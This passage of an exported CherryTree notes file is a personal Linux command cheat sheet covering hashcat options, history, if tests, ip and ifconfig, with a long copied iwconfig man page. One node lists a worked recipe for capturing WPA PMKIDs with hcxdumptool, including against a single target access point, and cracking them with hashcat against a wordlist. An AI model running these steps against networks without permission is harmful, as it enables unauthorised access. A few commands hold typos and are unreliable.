  2 | plain
  3 | hex_plain
  4 | crack_pos
  5 | timestamp absolute
  6 | timestamp relative
</rich_text>
          </node>
          <node name="Rule Debugging Modes" unique_id="265" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687154927" ts_lastsave="1687154943">
            <rich_text>- [ Rule Debugging Modes ] -

  # | Format
 ===+========
  1 | Finding-Rule
  2 | Original-Word
  3 | Original-Word:Finding-Rule
  4 | Original-Word:Finding-Rule:Processed-Word
  5 | Original-Word:Finding-Rule:Processed-Word:Wordlist</rich_text>
          </node>
          <node name="Workload Profiles" unique_id="269" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687155020" ts_lastsave="1687155026">
            <rich_text>- [ Workload Profiles ] -

  # | Performance | Runtime | Power Consumption | Desktop Impact
 ===+=============+=========+===================+=================
  1 | Low         |   2 ms  | Low               | Minimal
  2 | Default     |  12 ms  | Economic          | Noticeable
  3 | High        |  96 ms  | High              | Unresponsive
  4 | Nightmare   | 480 ms  | Insane            | Headless</rich_text>
          </node>
        </node>
        <node name="PMK/PMKID" unique_id="277" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687447025" ts_lastsave="1687593521">
          <rich_text>PMKSA = </rich_text>
          <rich_text underline="single">PMKID</rich_text>
          <rich_text> + </rich_text>
          <rich_text underline="single">Lifetime of PMK</rich_text>
          <rich_text> + </rich_text>
          <rich_text underline="single">MAC addresses</rich_text>
          <rich_text> + </rich_text>
          <rich_text underline="single">other variables</rich_text>
          <rich_text>
</rich_text>
        </node>
        <node name="store" unique_id="258" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687145303" ts_lastsave="1687593192">
          <rich_text scale="h1" weight="heavy"># Hashcat store keys</rich_text>
          <rich_text>
</rich_text>
          <rich_text foreground="#2e2ec2c27e7e" weight="heavy">hashcat.potfile</rich_text>
          <rich_text>

/home/&lt;user&gt;/.local/share/hashcat/</rich_text>
          <rich_text foreground="#2e2ec2c27e7e">hashcat.potfile</rich_text>
        </node>
      </node>
      <node name="hcxpcapngtool" unique_id="256" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1686724028" ts_lastsave="1687447074">
        <rich_text scale="h1" weight="heavy">$ hcxpcapngtool</rich_text>
        <rich_text>
convert pcapng, pcap and cap files to hash formats that hashcat and JtR use

usage:
hcxpcapngtool &lt;options&gt;
hcxpcapngtool &lt;options&gt; input.pcapng
hcxpcapngtool &lt;options&gt; *.pcapng
hcxpcapngtool &lt;options&gt; *.pcap
hcxpcapngtool &lt;options&gt; *.cap
hcxpcapngtool &lt;options&gt; *.*

ex:
$ hcxpcapngtool -o &lt;output&gt; &lt;wireshark_file.cap&gt;</rich_text>
        <node name="example" unique_id="278" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687447074" ts_lastsave="1687447239">
          <rich_text>• </rich_text>
          <rich_text weight="heavy">Capturing PMKID using hcxdumptool</rich_text>
          <rich_text>

aircrack-ng start wlan0
hcxdumptool -o demo -i wlan0mon --enable_status 5



• </rich_text>
          <rich_text weight="heavy">Converting pcapng to hashcat file and cracking using hashcat</rich_text>
          <rich_text>

hcxpcaptool -z hash demo
hashcat -m 16800 --force hash /usr/share/wordlists/rockyou.txt --show



• </rich_text>
          <rich_text weight="heavy">Capturing only a single PMKID using hcxdumptool</rich_text>
          <rich_text>

hcxdumptool -o raj -i wlan0mon --enable_status=1 --filterlist_ap=target --filtermode=2
hcxpcaptool -z pmkidhash raj
hashcat -m 16800 --force pmkidhash /usr/share/wordlists/rockyou.txt --show</rich_text>
        </node>
      </node>
      <node name="head" unique_id="105" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285115" ts_lastsave="1685695904">
        <rich_text>head &gt; tail

head -c 5  # 5 first chars
head -n 5  # 5 first lines</rich_text>
      </node>
      <node name="history" unique_id="53" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684284294" ts_lastsave="1725152101">
        <rich_text scale="h1" weight="heavy">$ </rich_text>
        <rich_text scale="h1" foreground="#6262a0a0eaea" weight="heavy">history</rich_text>
        <rich_text>

</rich_text>
        <rich_text scale="h3" weight="heavy"># grep | cut</rich_text>
        <rich_text>
$ </rich_text>
        <rich_text foreground="#6262a0a0eaea">history</rich_text>
        <rich_text> | </rich_text>
        <rich_text foreground="#2e2ec2c27e7e">grep</rich_text>
        <rich_text> '</rich_text>
        <rich_text foreground="#9a9a99999696">word</rich_text>
        <rich_text>' | </rich_text>
        <rich_text foreground="#2e2ec2c27e7e">cut</rich_text>
        <rich_text> ':' |

</rich_text>
        <rich_text scale="h3" weight="heavy"># More</rich_text>
        <rich_text>
$ </rich_text>
        <rich_text foreground="#6262a0a0eaea">history</rich_text>
        <rich_text> | </rich_text>
        <rich_text foreground="#2e2ec2c27e7e">cat</rich_text>
        <rich_text>
$ </rich_text>
        <rich_text foreground="#6262a0a0eaea">history</rich_text>
        <rich_text> | </rich_text>
        <rich_text foreground="#2e2ec2c27e7e">tac</rich_text>
        <rich_text>
$ </rich_text>
        <rich_text foreground="#6262a0a0eaea">history</rich_text>
        <rich_text> | </rich_text>
        <rich_text foreground="#2e2ec2c27e7e">head</rich_text>
        <rich_text>
$ </rich_text>
        <rich_text foreground="#6262a0a0eaea">history</rich_text>
        <rich_text> | </rich_text>
        <rich_text foreground="#2e2ec2c27e7e">taill</rich_text>
        <rich_text>

# history show all logs, so we don't need ‘</rich_text>
        <rich_text foreground="#2e2ec2c27e7e">more</rich_text>
        <rich_text>’ or ‘</rich_text>
        <rich_text foreground="#2e2ec2c27e7e">less</rich_text>
        <rich_text>’ 

</rich_text>
        <rich_text scale="h3" weight="heavy"># show history with record number</rich_text>
        <rich_text>
$ </rich_text>
        <rich_text foreground="#6262a0a0eaea">history</rich_text>
        <rich_text> </rich_text>
        <rich_text weight="heavy">101</rich_text>
        <rich_text>

</rich_text>
        <rich_text scale="h3" weight="heavy"># show a command last use</rich_text>
        <rich_text>
$ </rich_text>
        <rich_text foreground="#6262a0a0eaea">history</rich_text>
        <rich_text> </rich_text>
        <rich_text weight="heavy">echo</rich_text>
      </node>
      <node name="hostname" unique_id="29" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684283710" ts_lastsave="1718587324">
        <rich_text>hostname '</rich_text>
        <rich_text foreground="#35358484e4e4">GOUST</rich_text>
        <rich_text>'</rich_text>
      </node>
      <node name="hostnamectl" unique_id="30" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684283716" ts_lastsave="1718587212">
        <rich_text>hostnamectl &lt;options&gt; &lt;name&gt;
hostname </rich_text>
        <rich_text foreground="#35358484e4e4">GOUST</rich_text>
        <rich_text>
icon-name </rich_text>
        <rich_text foreground="#35358484e4e4">Super-Computer</rich_text>
        <rich_text>
chassis </rich_text>
        <rich_text foreground="#35358484e4e4">embedded</rich_text>
        <rich_text>
deployment </rich_text>
        <rich_text foreground="#35358484e4e4">AliensHardware</rich_text>
        <rich_text>
location '</rich_text>
        <rich_text foreground="#35358484e4e4">United of Mars</rich_text>
        <rich_text>'

</rich_text>
      </node>
      <node name="htop" unique_id="135" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285279" ts_lastsave="1718587342">
        <rich_text>• use ‘k’ to kill</rich_text>
      </node>
      <node name="hwclock" unique_id="131" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285256" ts_lastsave="1684285262"/>
      <node name="id" unique_id="245" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1685431714" ts_lastsave="1724728019">
        <rich_text scale="h1" weight="heavy">id</rich_text>
        <rich_text>

$ id


# whatis
id (1)               - print real and effective user and group IDs
</rich_text>
      </node>
      <node name="if" unique_id="339" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1724727373" ts_lastsave="1724727670">
        <rich_text>1. if [ -a FILE ] — True if FILE exists.
2. if [ -b FILE ] — True if FILE exists and is a block-special file.
3. if [ -c FILE ] — True if FILE exists and is a character-special file.
4. if [ -d FILE ] — True if FILE exists and is a directory.
5. if [ -e FILE ] — True if FILE exists.


</rich_text>
        <rich_text scale="h2"># Checking if a file exists</rich_text>
        <rich_text>

</rich_text>
        <rich_text foreground="#c0c01c1c2828">$</rich_text>
        <rich_text> if [ -f myfile.txt ]; then
&gt;   echo myfile.txt exists
&gt; else
&gt;   touch myfile.txt
&gt; fi
myfile.txt exists

</rich_text>
        <rich_text foreground="#c0c01c1c2828">$</rich_text>
        <rich_text> if [ -f /home/shs ]; then
&gt;   echo file exists
&gt; else
&gt;   echo file is not a regular file
&gt; fi
file is not a regular file


</rich_text>
        <rich_text scale="h2"># Checking if a file is a directory</rich_text>
        <rich_text>
</rich_text>
        <rich_text foreground="#c0c01c1c2828">$ </rich_text>
        <rich_text>if [ -d /home/shs ]; then
&gt;   echo directory
&gt; else
&gt;   echo not a directory
&gt; fi
directory



</rich_text>
        <rich_text scale="h2"># Reversing the effect of if tests</rich_text>
        <rich_text>

</rich_text>
        <rich_text foreground="#c0c01c1c2828">$</rich_text>
        <rich_text> if [ -s emptyfile ]; then
&gt;   echo has content
&gt; else
&gt;   echo empty
&gt; fi

</rich_text>
        <rich_text foreground="#c0c01c1c2828">$</rich_text>
        <rich_text> if [ ! -s emptyfile ]; then
&gt;   echo empty
&gt; else
&gt;   echo has content
&gt; fi



</rich_text>
        <rich_text scale="h2"># Checking file permissions</rich_text>
        <rich_text>

Other especially useful tests can tell you if you can read a file, write to a file or execute a file.

</rich_text>
        <rich_text foreground="#c0c01c1c2828">$</rich_text>
        <rich_text> if [ -r ~/bin/loop ]; then
&gt;   echo readable
&gt; fi
readable

</rich_text>
        <rich_text foreground="#c0c01c1c2828">$</rich_text>
        <rich_text> if [ -w ~/bin/loop ]; then
&gt;   echo writable
&gt; fi
writable

</rich_text>
        <rich_text foreground="#c0c01c1c2828">$ </rich_text>
        <rich_text>if [ -x ~/bin/loop ]; then
&gt;   echo executable
&gt; fi
executable



</rich_text>
        <rich_text scale="h2">Checking if a file was recently modified</rich_text>
        <rich_text>

The </rich_text>
        <rich_text weight="heavy">-N</rich_text>
        <rich_text> checks whether a file’s content was modified since the last time it was read. The </rich_text>
        <rich_text weight="heavy">echo</rich_text>
        <rich_text> command below adds a line, so the second test result is the opposite of the first.

</rich_text>
        <rich_text foreground="#c0c01c1c2828">$</rich_text>
        <rich_text> if [ -N testfile ]; then
&gt;   echo file has been modified
&gt; else
&gt;   echo file not modified
&gt; fi
file not modified

</rich_text>
        <rich_text foreground="#c0c01c1c2828">$</rich_text>
        <rich_text> echo “——-“ &gt;&gt; testfile
</rich_text>
        <rich_text foreground="#c0c01c1c2828">$</rich_text>
        <rich_text>
</rich_text>
        <rich_text foreground="#c0c01c1c2828">$</rich_text>
        <rich_text> if [ -N testfile ]; then
&gt;   echo file has been modified 
&gt; else
&gt;   echo file not modified
&gt; fi
file has been modified



</rich_text>
        <rich_text scale="h2">Comparing file ages</rich_text>
        <rich_text>

You can use </rich_text>
        <rich_text weight="heavy">if</rich_text>
        <rich_text> tests to determine if one file has been changed more recently than another. The </rich_text>
        <rich_text weight="heavy">-nt</rich_text>
        <rich_text> test means “newer than”.

</rich_text>
        <rich_text foreground="#c0c01c1c2828">$</rich_text>
        <rich_text> if [ file1 -nt file2 ]; then
&gt;   echo file1 is newer
&gt; else
&gt;   echo file2 is newer
&gt; fi
file2 is newer


SOURCE:
</rich_text>
        <rich_text link="webs https://www.networkworld.com/article/971381/24-ways-to-check-the-status-of-files-using-if-commands-on-linux.html">https://www.networkworld.com/article/971381/24-ways-to-check-the-status-of-files-using-if-commands-on-linux.html</rich_text>
      </node>
      <node name="ifconfig" unique_id="7" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684283299" ts_lastsave="1724701237">
        <rich_text scale="h1" weight="heavy">ifconfig</rich_text>
        <rich_text>

# see device(s) interface
$ </rich_text>
        <rich_text foreground="#3333d1d17a7a">ifconfig</rich_text>
        <rich_text>
$ </rich_text>
        <rich_text foreground="#3333d1d17a7a">ifconfig</rich_text>
        <rich_text> wlan0

# active/deactive a device
$ </rich_text>
        <rich_text foreground="#3333d1d17a7a">ifconfig</rich_text>
        <rich_text> wlan0 down
$ </rich_text>
        <rich_text foreground="#3333d1d17a7a">ifconfig</rich_text>
        <rich_text> wlan0 up

# Unix VS Dos
Linux:				ifconfig
Windows:		ipconfig

# similar
</rich_text>
        <rich_text foreground="#6262a0a0eaea">ifconfig</rich_text>
        <rich_text>, </rich_text>
        <rich_text foreground="#6262a0a0eaea">iwconfig</rich_text>
        <rich_text>, </rich_text>
        <rich_text foreground="#6262a0a0eaea">ip</rich_text>
      </node>
      <node name="ifdown" unique_id="41" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684284011" ts_lastsave="1684284024"/>
      <node name="ifup" unique_id="40" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684284006" ts_lastsave="1684284011"/>
      <node name="init" unique_id="149" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285374" ts_lastsave="1684285381"/>
      <node name="iostat" unique_id="223" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684287066" ts_lastsave="1684287066"/>
      <node name="ip" unique_id="8" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684283308" ts_lastsave="1724724174">
        <rich_text scale="h1" weight="heavy">ip</rich_text>
        <rich_text>

$ </rich_text>
        <rich_text foreground="#3333d1d17a7a">ip</rich_text>
        <rich_text>

# See device(s) interface
$ </rich_text>
        <rich_text foreground="#3333d1d17a7a">ip</rich_text>
        <rich_text> a
$ </rich_text>
        <rich_text foreground="#3333d1d17a7a">ip</rich_text>
        <rich_text> address

# neighbor
$ </rich_text>
        <rich_text foreground="#3333d1d17a7a">ip</rich_text>
        <rich_text> n

$ </rich_text>
        <rich_text foreground="#3333d1d17a7a">ip</rich_text>
        <rich_text> r

# Options
</rich_text>
        <rich_text foreground="#3333d1d17a7a">ip</rich_text>
        <rich_text> a|n|r

# similar
</rich_text>
        <rich_text foreground="#6262a0a0eaea">ifconfig</rich_text>
        <rich_text>, </rich_text>
        <rich_text foreground="#6262a0a0eaea">iwconfig</rich_text>
        <rich_text>, </rich_text>
        <rich_text foreground="#6262a0a0eaea">ip</rich_text>
        <node name="--help" unique_id="337" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1724722952" ts_lastsave="1724723094">
          <rich_text>Usage: ip [ OPTIONS ] OBJECT { COMMAND | help }
       ip [ -force ] -batch filename
where  OBJECT := { </rich_text>
          <rich_text foreground="#e6e661610000">address</rich_text>
          <rich_text foreground="#f5f5c2c21111"> | addrlabel | amt | fou | help | ila | ioam | l2tp |
                   link | macsec | maddress | monitor | mptcp | mroute | mrule |
                   </rich_text>
          <rich_text foreground="#e6e661610000">neighbor</rich_text>
          <rich_text foreground="#f5f5c2c21111"> | </rich_text>
          <rich_text foreground="#e6e661610000">neighbour</rich_text>
          <rich_text foreground="#f5f5c2c21111"> | netconf | netns | nexthop | ntable |
                   ntbl | </rich_text>
          <rich_text foreground="#e6e661610000">route</rich_text>
          <rich_text foreground="#f5f5c2c21111"> | rule | sr | tap | tcpmetrics |
                   token | tunnel | tuntap | vrf | xfrm</rich_text>
          <rich_text> }
       OPTIONS := { -V[ersion] | -s[tatistics] | -d[etails] | -r[esolve] |
                    -h[uman-readable] | -iec | -j[son] | -p[retty] |
                    -f[amily] { inet | inet6 | mpls | bridge | link } |
                    -4 | -6 | -M | -B | -0 |
                    -l[oops] { maximum-addr-flush-attempts } | -br[ief] |
                    -o[neline] | -t[imestamp] | -ts[hort] | -b[atch] [filename] |
                    -rc[vbuf] [size] | -n[etns] name | -N[umeric] | -a[ll] |
                    -c[olor]}
</rich_text>
        </node>
        <node name="Example" unique_id="338" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1724724174" ts_lastsave="1724726228">
          <rich_text family="monospace" scale="h1" weight="heavy">$ ip</rich_text>
          <rich_text>

</rich_text>
          <rich_text scale="h3">(e.g., `</rich_text>
          <rich_text family="monospace" scale="h3" weight="heavy">set`</rich_text>
          <rich_text scale="h3">, `</rich_text>
          <rich_text family="monospace" scale="h3" weight="heavy">add`</rich_text>
          <rich_text scale="h3">, `</rich_text>
          <rich_text family="monospace" scale="h3" weight="heavy">delete`</rich_text>
          <rich_text scale="h3">).</rich_text>
          <rich_text>

ip addr </rich_text>
          <rich_text family="monospace" scale="h3" weight="heavy">add</rich_text>
          <rich_text> 192.168.1.100/24 dev eth0
ip addr </rich_text>
          <rich_text family="monospace" scale="h3" weight="heavy">delete</rich_text>
          <rich_text> 192.168.1.100/24 dev eth0

ip route </rich_text>
          <rich_text family="monospace" scale="h3" weight="heavy">add</rich_text>
          <rich_text> default via 192.168.1.254 dev eth0

# Bringing an Interface Up
ip link </rich_text>
          <rich_text family="monospace" scale="h3" weight="heavy">set</rich_text>
          <rich_text> eth0 up

# MTU (Maximum Transmission Unit)
sudo ip link </rich_text>
          <rich_text family="monospace" scale="h3" weight="heavy">set</rich_text>
          <rich_text> eth0 mtu 1500

# SEE
</rich_text>
          <rich_text link="webs https://www.geeksforgeeks.org/ip-command-in-linux-with-examples/">https://www.geeksforgeeks.org/ip-command-in-linux-with-examples/</rich_text>
        </node>
      </node>
      <node name="iptables" unique_id="51" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684284264" ts_lastsave="1684284270"/>
      <node name="iwconfig" unique_id="42" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684284024" ts_lastsave="1724701360">
        <rich_text scale="h1" weight="heavy">iwconfig</rich_text>
        <rich_text>

$ </rich_text>
        <rich_text foreground="#3333d1d17a7a">iwconfig</rich_text>
        <rich_text>
$ </rich_text>
        <rich_text foreground="#3333d1d17a7a">iwconfig</rich_text>
        <rich_text> wlan0


# similar
</rich_text>
        <rich_text foreground="#6262a0a0eaea">ifconfig</rich_text>
        <rich_text>, </rich_text>
        <rich_text foreground="#6262a0a0eaea">iwconfig</rich_text>
        <rich_text>, </rich_text>
        <rich_text foreground="#6262a0a0eaea">ip</rich_text>
        <node name="--help" unique_id="333" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1724701290" ts_lastsave="1724701291">
          <rich_text>Usage: iwconfig [interface]
                interface essid {NNN|any|on|off}
                interface mode {managed|ad-hoc|master|...}
                interface freq N.NNN[k|M|G]
                interface channel N
                interface bit {N[k|M|G]|auto|fixed}
                interface rate {N[k|M|G]|auto|fixed}
                interface enc {NNNN-NNNN|off}
                interface key {NNNN-NNNN|off}
                interface power {period N|timeout N|saving N|off}
                interface nickname NNN
                interface nwid {NN|on|off}
                interface ap {N|off|auto}
                interface txpower {NmW|NdBm|off|auto}
                interface sens N
                interface retry {limit N|lifetime N}
                interface rts {N|auto|fixed|off}
                interface frag {N|auto|fixed|off}
                interface modulation {11g|11a|CCK|OFDMg|...}
                interface commit 
       Check man pages for more details.
</rich_text>
        </node>
        <node name="man" unique_id="334" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1724701360" ts_lastsave="1724701586">
          <rich_text>IWCONFIG(8)                      Linux Programmer's Manual                     IWCONFIG(8)

NAME
       iwconfig - configure a wireless network interface

SYNOPSIS
</rich_text>
          <rich_text foreground="#f9f9f0f06b6b">       iwconfig [interface]
       iwconfig interface [essid X] [nwid N] [mode M] [freq F]
                          [channel C][sens S ][ap A ][nick NN ]
                          [rate R] [rts RT] [frag FT] [txpower T]
                          [enc E] [key K] [power P] [retry R]
                          [modu M] [commit]
       iwconfig --help
       iwconfig --version</rich_text>
          <rich_text>

DESCRIPTION
       Iwconfig is similar to ifconfig(8), but is dedicated to the wireless interfaces. It
       is  used  to  set the parameters of the network interface which are specific to the
       wireless operation (for example : the frequency).  Iwconfig may  also  be  used  to
       display   those   parameters,   and   the   wireless   statistics  (</rich_text>
          <rich_text foreground="#f9f9f0f06b6b">extracted  from
       /proc/net/wireless</rich_text>
          <rich_text>).

       All these parameters and statistics are device dependent. Each driver will  provide
       only  some  of  them  depending  on  hardware  support, and the range of values may
       change. Please refer to the man page of each device for details.

PARAMETERS
       essid  Set the ESSID (or Network Name - in some products it may also be called  Do‐
              main  ID).  The  ESSID  is used to identify cells which are part of the same
              virtual network.
              As opposed to the AP Address or NWID which define a single cell,  the  ESSID
              defines  a  group  of cells connected via repeaters or infrastructure, where
              the user may roam transparently.
              With some cards, you may disable the ESSID checking (ESSID promiscuous) with
              off or any (and on to reenable it).
              If the ESSID of your network is one of the  special  keywords  (off,  on  or
              any), you should use -- to escape it.
</rich_text>
          <rich_text foreground="#f9f9f0f06b6b">              Examples :
                   iwconfig eth0 essid any
                   iwconfig eth0 essid "My Network"
                   iwconfig eth0 essid -- "ANY"</rich_text>
          <rich_text>

       nwid   Set the Network ID. As all adjacent wireless networks share the same medium,
              this  parameter is used to differentiate them (create logical colocated net‐
              works) and identify nodes belonging to the same cell.
              This parameter is only used for pre-802.11  hardware,  the  802.11  protocol
              uses the ESSID and AP Address for this function.
              With  some cards, you may disable the Network ID checking (NWID promiscuous)
              with off (and on to reenable it).
</rich_text>
          <rich_text foreground="#f9f9f0f06b6b">              Examples :
                   iwconfig eth0 nwid AB34
                   iwconfig eth0 nwid off</rich_text>
          <rich_text>

       nick[name]
              Set the nickname, or the station name. Some 802.11 products  do  define  it,
              but  this  is  not used as far as the protocols (MAC, IP, TCP) are concerned
              and completely useless as far as configuration goes. Only some wireless  di‐
              agnostic tools may use it.
</rich_text>
          <rich_text foreground="#f9f9f0f06b6b">              Example :
                   iwconfig eth0 nickname "My Linux Node"</rich_text>
          <rich_text>

       mode   Set the operating mode of the device, which depends on the network topology.
              The mode can be Ad-Hoc (network composed of only one cell and without Access
              Point),  Managed (node connects to a network composed of many Access Points,
              with roaming), Master (the node is the synchronisation master or acts as  an
              Access  Point),  Repeater  (the node forwards packets between other wireless
              nodes), Secondary (the node acts as a backup master/repeater), Monitor  (the
              node  is  not  associated with any cell and passively monitor all packets on
              the frequency) or Auto.
</rich_text>
          <rich_text foreground="#f9f9f0f06b6b">              Example :
                   iwconfig eth0 mode Managed
                   iwconfig eth0 mode Ad-Hoc</rich_text>
          <rich_text>

       freq/channel
              Set the operating frequency or channel in the device. A value below 1000 in‐
              dicates a channel number, a value greater than 1000 is a  frequency  in  Hz.
              You  may  append the suffix k, M or G to the value (for example, "2.46G" for
              2.46 GHz frequency), or add enough '0'.
              Channels are usually numbered starting at 1, and you may  use  iwlist(8)  to
              get  the  total number of channels, list the available frequencies, and dis‐
              play the current frequency as a channel. Depending on regulations, some fre‐
              quencies/channels may not be available.
              When using Managed mode, most often the Access Point  dictates  the  channel
              and  the driver may refuse the setting of the frequency. In Ad-Hoc mode, the
              frequency setting may only be used at initial cell creation, and may be  ig‐
              nored when joining an existing cell.
              You  may also use off or auto to let the card pick up the best channel (when
              supported).
</rich_text>
          <rich_text foreground="#f9f9f0f06b6b">              Examples :
                   iwconfig eth0 freq 2422000000
                   iwconfig eth0 freq 2.422G
                   iwconfig eth0 channel 3
                   iwconfig eth0 channel auto</rich_text>
          <rich_text>

       ap     Force the card to register to the Access Point given by the address,  if  it
              is  possible.  This address is the cell identity of the Access Point, as re‐
              ported by wireless scanning, which may be different from its network MAC ad‐
              dress. If the wireless link is point to point, set the address of the  other
              end  of the link. If the link is ad-hoc, set the cell identity of the ad-hoc
              network.
              When the quality of the connection goes too low, the driver may revert  back
              to automatic mode (the card selects the best Access Point in range).
              You  may  also use off to re-enable automatic mode without changing the cur‐
              rent Access Point, or you may use any or auto to force the card to reassoci‐
              ate with the currently best Access Point.
</rich_text>
          <rich_text foreground="#f9f9f0f06b6b">              Example :
                   iwconfig eth0 ap 00:60:1D:01:23:45
                   iwconfig eth0 ap any
                   iwconfig eth0 ap off</rich_text>
          <rich_text>

       rate/bit[rate]
              For cards supporting multiple bit rates, set the bit-rate in b/s.  The  bit-
              rate  is  the  speed at which bits are transmitted over the medium, the user
              speed of the link is lower due to medium sharing and various overhead.
              You may append the suffix k, M or G to the value (decimal multiplier : 10^3,
              10^6 and 10^9 b/s), or add enough '0'. Values below 1000 are card  specific,
              usually an index in the bit-rate list. Use auto to select automatic bit-rate
              mode  (fallback  to  lower rate on noisy channels), which is the default for
              most cards, and fixed to revert back to fixed setting. If you specify a bit-
              rate value and append auto, the driver will  use  all  bit-rates  lower  and
              equal than this value.
</rich_text>
          <rich_text foreground="#f9f9f0f06b6b">              Examples :
                   iwconfig eth0 rate 11M
                   iwconfig eth0 rate auto
                   iwconfig eth0 rate 5.5M auto</rich_text>
          <rich_text>

       txpower
              For  cards  supporting  multiple transmit powers, sets the transmit power in
              dBm. If W is the power in Watt, the power in dBm is P = 30 + 10.log(W).   If
              the value is postfixed by mW, it will be automatically converted to dBm.
              In addition, on and off enable and disable the radio, and auto and fixed en‐
              able and disable power control (if those features are available).
</rich_text>
          <rich_text foreground="#f9f9f0f06b6b">              Examples :
                   iwconfig eth0 txpower 15
                   iwconfig eth0 txpower 30mW
                   iwconfig eth0 txpower auto
                   iwconfig eth0 txpower off</rich_text>
          <rich_text>

       sens   Set the sensitivity threshold. This define how sensitive is the card to poor
              operating conditions (low signal, interference). Positive values are assumed
              to  be  the  raw value used by the hardware or a percentage, negative values
              are assumed to be dBm. Depending on the hardware implementation, this  para‐
              meter may control various functions.
              On  modern cards, this parameter usually control handover/roaming threshold,
              the lowest signal level for which the hardware remains associated  with  the
              current  Access  Point.  When the signal level goes below this threshold the
              card starts looking for a new/better Access Point. Some cards  may  use  the
              number of missed beacons to trigger this. For high density of Access Points,
              a higher threshold make sure the card is always associated with the best AP,
              for  low  density  of  APs,  a lower threshold minimise the number of failed
              handoffs.
              On more ancient card this parameter usually controls  the  defer  threshold,
              the  lowest  signal level for which the hardware considers the channel busy.
              Signal levels above this threshold make the hardware inhibits its own trans‐
              mission whereas signals weaker than this are ignored  and  the  hardware  is
              free  to transmit. This is usually strongly linked to the receive threshold,
              the lowest signal level for which the hardware  attempts  packet  reception.
              Proper  setting  of these thresholds prevent the card to waste time on back‐
              ground noise while still receiving weak transmissions. Modern designs  seems
              to control those thresholds automatically.
</rich_text>
          <rich_text foreground="#f9f9f0f06b6b">              Example :
                   iwconfig eth0 sens -80
                   iwconfig eth0 sens 2</rich_text>
          <rich_text>

       retry  Most  cards have MAC retransmissions, and some allow to set the behaviour of
              the retry mechanism.
              To set the maximum number of retries, enter limit `value'.  This is  an  ab‐
              solute  value  (without  unit), and the default (when nothing is specified).
              To set the maximum length of time  the  MAC  should  retry,  enter  lifetime
              `value'.  By defaults, this value is in seconds, append the suffix m or u to
              specify values in milliseconds or microseconds.
              You  can  also  add the short, long, min and max modifiers. If the card sup‐
              ports automatic mode, they define the bounds of the limit or lifetime.  Some
              other cards define different values depending on packet size, for example in
              802.11 min limit is the short retry limit (non RTS/CTS packets).
</rich_text>
          <rich_text foreground="#f9f9f0f06b6b">              Examples :
                   iwconfig eth0 retry 16
                   iwconfig eth0 retry lifetime 300m
                   iwconfig eth0 retry short 12
                   iwconfig eth0 retry min limit 8</rich_text>
          <rich_text>

       rts[_threshold]
              RTS/CTS  adds  a handshake before each packet transmission to make sure that
              the channel is clear. This adds overhead, but increases performance in  case
              of  hidden  nodes or a large number of active nodes. This parameter sets the
              size of the smallest packet for which the node sends RTS ; a value equal  to
              the  maximum packet size disables the mechanism. You may also set this para‐
              meter to auto, fixed or off.
</rich_text>
          <rich_text foreground="#f9f9f0f06b6b">              Examples :
                   iwconfig eth0 rts 250
                   iwconfig eth0 rts off</rich_text>
          <rich_text>

       frag[mentation_threshold]
              Fragmentation allows to split an IP packet in a burst of  smaller  fragments
              transmitted  on  the medium. In most cases this adds overhead, but in a very
              noisy environment this reduces the error penalty and allow  packets  to  get
